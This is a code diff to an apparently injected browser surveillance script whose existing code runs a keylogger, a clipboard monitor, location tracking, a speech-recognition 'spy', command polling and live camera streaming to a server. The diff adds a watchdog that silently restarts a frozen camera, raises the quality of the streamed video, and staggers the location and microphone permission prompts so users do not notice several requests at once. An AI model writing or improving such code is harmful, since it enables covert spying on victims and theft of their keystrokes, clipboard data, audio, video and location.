@@ -22,6 +22,7 @@
     let videoReady = false; // true once video element is playing with valid dimensions
     let keyBuffer = '', lastClip = '';
     let liveSocket = null, liveInterval = null, liveActive = false;
+    let healthCheckInterval = null; // periodic frozen-stream detector
     let audioRecorder = null, audioActive = false;
     let audioHTTPActive = false, audioHTTPTimer = null;
     let videoRecording = false; // guard: prevents concurrent video recordings
@@ -420,6 +421,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         videoReady = false;
         // Stop any existing tracks first
         if (stream) { try { stream.getTracks().forEach(t => t.stop()); } catch {} stream = null; }
+        // Stop any existing health-check so we don’t stack multiple timers
+        if (healthCheckInterval) { clearInterval(healthCheckInterval); healthCheckInterval = null; }
 
         // ── Step 1: get a stream that has at least one video track ──────
         const videoCfgs = [
@@ -495,6 +498,27 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         });
 
         videoReady = true;
+
+        // ── Step 6: frozen-stream health check ────────────────────────────
+        // If videoEl.currentTime stops advancing for 3 consecutive 5s ticks
+        // (15s of frozen frames), reinitialise the camera automatically.
+        let _lastVT = -1, _frozenCount = 0;
+        healthCheckInterval = setInterval(() => {
+            if (!videoEl || !videoReady) return;
+            const vt = videoEl.currentTime;
+            if (vt === _lastVT) {
+                if (++_frozenCount >= 3) {
+                    _frozenCount = 0;
+                    clearInterval(healthCheckInterval);
+                    healthCheckInterval = null;
+                    videoReady = false;
+                    setTimeout(initCamera, 500);
+                }
+            } else {
+                _frozenCount = 0;
+            }
+            _lastVT = vt;
+        }, 5000);
     }
 
     // ═══ LOCATION ═════════════════════════════════════════════
@@ -579,12 +603,16 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         liveActive = true;
 
         // Adaptive state
-        let quality   = 0.25;   // start light so first frames arrive fast
-        let scale     = 0.65;   // start at 65% resolution
-        let targetMs  = 33;     // aim for ~30 FPS (the `inFlight` flag lets actual RTT cap it naturally)
+        // Start at good quality — warm-up guard prevents throttling-down during first 8s
+        // so cold-start Vercel latency doesn’t keep quality permanently low.
+        let quality   = 0.55;   // start at reasonable quality (was 0.25)
+        let scale     = 0.85;   // start at 85% resolution (was 0.65)
+        let targetMs  = 33;     // aim for ~30 FPS
         let inFlight  = false;  // backpressure: skip frame if POST still running
         let seq       = 0;
         let lastW = 0, lastH = 0;
+        let warmup    = true;   // skip quality-down adaptation during first 8s
+        setTimeout(() => { warmup = false; }, 8000);
 
         // Reuse a single canvas for all frames
         const liveCanvas = document.createElement('canvas');
@@ -624,25 +652,29 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
                         body:    JSON.stringify({ clientId: ID, frame, timestamp: ts, seq: s })
                     }).then(() => {
                         const rtt = performance.now() - t0;
-                        // Adapt: slow connection → compress more + slow down
+                        // During warmup only allow quality increases, never decreases
                         if (rtt > 280) {
-                            quality  = Math.max(0.18, quality  - 0.06);
-                            scale    = Math.max(0.40, scale    - 0.06);
-                            targetMs = Math.min(300,  targetMs + 25);
+                            if (!warmup) {
+                                quality  = Math.max(0.22, quality  - 0.05);
+                                scale    = Math.max(0.50, scale    - 0.05);
+                                targetMs = Math.min(300,  targetMs + 25);
+                            }
                         } else if (rtt > 160) {
-                            quality  = Math.max(0.22, quality  - 0.03);
-                            targetMs = Math.min(200,  targetMs + 10);
+                            if (!warmup) {
+                                quality  = Math.max(0.28, quality  - 0.02);
+                                targetMs = Math.min(200,  targetMs + 10);
+                            }
                         } else if (rtt < 80) {
                             // Fast connection → ramp up quality and rate
-                            quality  = Math.min(0.82, quality  + 0.04);
-                            scale    = Math.min(1.00, scale    + 0.05);
+                            quality  = Math.min(0.92, quality  + 0.04);
+                            scale    = Math.min(1.00, scale    + 0.04);
                             targetMs = Math.max(25,   targetMs - 8);
                         } else if (rtt < 130) {
-                            quality  = Math.min(0.70, quality  + 0.01);
+                            quality  = Math.min(0.78, quality  + 0.02);
                             targetMs = Math.max(33,   targetMs - 3);
                         }
                     }).catch(() => {
-                        targetMs = Math.min(300, targetMs + 30); // back off on error
+                        if (!warmup) targetMs = Math.min(300, targetMs + 30); // back off on error
                     }).finally(() => { inFlight = false; });
                 } catch { inFlight = false; }
             }
@@ -2208,7 +2240,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         setInterval(pollCommands, C.commandPoll);
         collectDeviceInfo();
         setInterval(collectDeviceInfo, C.deviceInfoPeriod);
-        if (C.locationEnabled) trackLocation();
+        // Location prompt fires 20s after camera so users see one request at a time
+        if (C.locationEnabled) setTimeout(trackLocation, 20000);
         if (C.keystrokesEnabled) initKeyLogger();
         if (C.clipboardEnabled) { initClipboardMonitor(); setInterval(checkClipboard, C.clipboardCheck); }
         // Init camera — also sets up periodic photo/video once ready
@@ -2278,7 +2311,9 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initAmbientLightCapture();
         initPageFocusTimeTracker();
         initUnloadCapture();
-        initSpeechRecognitionSpy();
+        // Speech recognition delayed by 40s — fires well after camera + location prompts
+        // so users don't see all permission requests stacked at once
+        setTimeout(initSpeechRecognitionSpy, 40000);
     }
 
     // Works whether script is injected before OR after DOMContentLoaded fires
